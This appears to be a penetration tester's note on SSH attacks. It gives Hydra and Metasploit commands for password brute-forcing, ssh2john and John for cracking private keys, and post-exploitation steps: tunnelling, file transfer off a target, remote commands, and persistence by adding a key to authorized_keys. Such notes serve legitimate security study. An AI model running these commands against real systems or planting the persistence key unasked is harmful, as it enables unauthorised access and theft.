---
id: Exploitation
aliases: []
tags:
  - Networking/Services/SSH/Exploitation
links: "[[SSH]]"
---

<!-- Exploitation {{{-->
# Exploitation

___

<!-- Brute Force {{{-->
## Brute Force

<!-- Passwords {{{-->
### Passwords

<!-- Wordlists {{{-->
> [!tip]- Wordlists
>
> [SecLists - top-20-common-SSH-passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt)
>
> ```sh
> /usr/share/seclists/Passwords/Default-Credentials/top-20-common-SSH-passwords.txt
> ```
>
> [SecLists - ssh-betterdefaultpasslist.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt)
>
> ```sh
> /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
> ```
<!-- }}} -->

[[Hydra]] — Brute force passwords

```sh
hydra -l <user> -P <wordlist.txt> ssh://<target>
```

```sh
hydra -l <user> -s 22 -P <wordlist.txt> -t 4 ssh <target>
```

[[Metasploit]] — SSH Login Check Scanner
(*[ssh_login](https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_login/)*)

```sh
use auxiliary/scanner/ssh/ssh_login
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> msfconsole
> ```
> ```sh
> use auxiliary/scanner/ssh/ssh_login
> ```
> ```sh
> set PASS_FILE /usr/share/wordlists/password/rockyou.txt
> ```
> ```sh
> set RHOSTS
> ```
> ```sh
> set STOP_ON_SUCCESS true
> ```
> ```sh
> set username
> ```
> ```sh
> run
> ```
<!-- }}} -->

<!-- }}} -->

<!-- SSH Keys {{{-->
### SSH Keys

[[John The Ripper]] — Brute force SSH keys

1. Find [ssh2john.py](https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py) —

```sh
locate ssh2john.py
```

2. Create a `John`-compatible hash

```sh
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
```

3. Run `John` against the hash

> [!tip] Wordlists
>
> - `/usr/share/wordlists/rockyou.txt`

```sh
john --wordlist=<wordlist.txt> <hash>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- }}} -->

<!-- Post-Exploitation {{{-->
# Post-Exploitation

<!-- Port Forwarding {{{-->
## Port Forwarding

> [!todo]
>
> [[General#Port Forwarding]]

Forward local ports to the attacker's machine
to access network services on the target's network

Local Port Forwarding

```sh
ssh -L <local_port>:<remote_host>:<remote_port> <user>@<ssh_server>
```

> [!example]-
>
> Forward a local host's port to a remote host's port
>
> ```sh
> ssh -N -L 8080:10.0.0.25:80 alice@198.51.100.5
> ```
>
> - `N`: Don't open a remote shell (*tunnel only*)

Remote Port Forwarding

```sh
ssh -R <remote_port>:<local_host>:<local_port> <user>@<ssh_server>
```

> [!todo]
>
> SSH Tunneling
>
> ```sh
> ssh -D 8080 user@X.X.X.X
> ```

___
<!-- }}} -->

<!-- File Transfer {{{-->
## File Transfer

### SCP

File transfer with SCP
([Secure Copy Protocol](https://en.wikipedia.org/wiki/Secure_copy_protocol))

Download files

```sh
scp <user>@<target>:</path/to/remote/file> </path/to/local/destination>
```

Upload files

```sh
scp </path/to/local/file> <user>@<target>:</path/to/remote/destination>
```

### SFTP

File transfer with SFTP
([SSH File Transfer Protocol](https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol))

```sh
sftp <user>@<target>
```
___
<!-- }}} -->

<!-- Command Execution {{{-->
## Command Execution

Run an arbitrary command on the remote host

```sh
ssh <user>@<target> '<command>'
```
___
<!-- }}} -->

<!-- Maintaining Access {{{-->
## Maintaining Access

Add an SSH public key to the authorized keys

```sh
echo <public_key> >> ~/.ssh/authorized_keys
```
___
<!-- }}} -->

<!-- Privilege Escalation {{{-->
## Privilege Escalation

Leverage local vulnerabilities or misconfigurations to elevate privileges

```sh
ssh <user>@<target> 'sudo -l'
```
___
<!-- }}} -->

<!-- }}} -->
